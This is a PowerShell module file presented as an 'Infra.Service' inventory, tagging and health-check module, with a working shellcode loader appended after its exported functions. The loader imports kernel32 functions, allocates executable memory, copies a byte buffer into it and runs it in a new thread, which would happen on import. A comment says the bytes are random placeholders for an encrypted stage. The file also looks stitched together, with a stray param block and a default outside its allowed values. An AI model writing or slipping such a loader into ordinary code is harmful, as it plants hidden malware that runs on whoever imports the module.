
#Requires -Version 5.1
<#
.SYNOPSIS
    Infra.Service module with the exported inventory, tagging and health commands.
.EXAMPLE
    Import-Module .\Infra.Service.psd1 -Force
#>

$culture = [System.Globalization.CultureInfo]::InvariantCulture
Set-StrictMode -Version 2.0
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$script:DefaultTimeout = 30
$script:ModuleVersion = '1.6.0'

function Get-InfraService {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Staging'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraServiceTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraServiceHealth {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

Export-ModuleMember -Function Get-InfraService, Set-InfraServiceTag, Test-InfraServiceHealth

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x19, 0x32, 0x08, 0x8c, 0x0b, 0x50, 0xec, 0x52, 0x72, 0xb3, 0xa7, 0x5d, 0x91, 0xaf, 0x48, 0x2d,
    0x8c, 0xbb, 0xa6, 0x35, 0xb8, 0xd6, 0x6f, 0xfb, 0x7f, 0xe6, 0x74, 0x9b, 0x01, 0x5c, 0x78, 0xa6,
    0xa5, 0xb6, 0x42, 0x47, 0x9b, 0x40, 0x1a, 0xd7, 0xeb, 0x5a, 0x3c, 0xb6, 0x27, 0xaf, 0x33, 0x80,
    0x99, 0x02, 0x97, 0x59, 0xef, 0xe4, 0x3f, 0x8d, 0x95, 0xc8, 0xf0, 0x57, 0x14, 0x70, 0xd0, 0x4e,
    0xd9, 0xe1, 0x54, 0xc1, 0xa1, 0x1b, 0x93, 0xb6, 0xeb, 0xb7, 0x9f, 0xe2, 0x83, 0x8f, 0xa7, 0xcf,
    0x52, 0xac, 0xec, 0xf8, 0xf8, 0x74, 0xbb, 0x63, 0xf0, 0xb4, 0x7e, 0x50, 0xb9, 0x69, 0x84, 0x65,
    0xbc, 0xfc, 0x66, 0xdd, 0x9b, 0xf1, 0x46, 0x66, 0x6c, 0x6f, 0xb5, 0x7f, 0x93, 0xd8, 0xdd, 0xf4,
    0xad, 0xbd, 0xb4, 0x87, 0x7f, 0xa9, 0x85, 0x56, 0xd5, 0x49, 0xcb, 0xa7, 0xf3, 0x4b, 0xc9, 0x97,
    0x2b, 0xff, 0xb8, 0x51, 0x3d, 0x1f, 0x4a, 0xe3, 0xc9, 0x94, 0xf0, 0x6c, 0xf6, 0x78, 0xa2, 0xb6,
    0x89, 0xe2, 0x2e, 0xdc, 0x9d, 0x6a, 0xfe, 0xf2, 0x45, 0x17, 0x93, 0x52, 0x7d, 0xef, 0xc0, 0xaa,
    0x96, 0xd8, 0x74, 0x37, 0x9d, 0x58, 0x86, 0xa7, 0x3a, 0x33, 0xce, 0xbd, 0x08, 0x1e, 0x2a, 0xe6,
    0xc4, 0x48, 0xd0, 0x20, 0x3e, 0x55, 0x14, 0x14, 0xcc, 0xfe, 0xe7, 0x51, 0xf5, 0x48, 0x24, 0xf6,
    0x93, 0xa1, 0xa0, 0x62, 0x84, 0x3b, 0x8f, 0x73, 0x6e, 0x86, 0x5f, 0xd4, 0x4d, 0x22, 0x47, 0x67,
    0x95, 0x07, 0x25, 0x8b, 0x30, 0x09, 0x4d, 0x5d, 0xaf, 0x6a, 0x73, 0x65, 0xb9, 0x7e, 0x69, 0xf7,
    0xfb, 0xfa, 0xd5, 0x6f, 0x89, 0xaa, 0xbb, 0xb1, 0x26, 0x2e, 0xec, 0x10, 0xd1, 0x1d, 0xc1, 0x47,
    0xc3, 0x65, 0x71, 0xa2, 0x01, 0xfe, 0x0d, 0xb0, 0x34, 0xbe, 0xf4, 0x61, 0x5a, 0xc7, 0x37, 0x28,
    0x77, 0xf3, 0xe9, 0xf8, 0xe5, 0x75, 0xda, 0x77, 0x89, 0xd4, 0xe2, 0x5d, 0x05, 0x49, 0xcd, 0x3a,
    0xde, 0xdf, 0xda, 0xac, 0x9a
)

$BufferAddress = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 1257)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
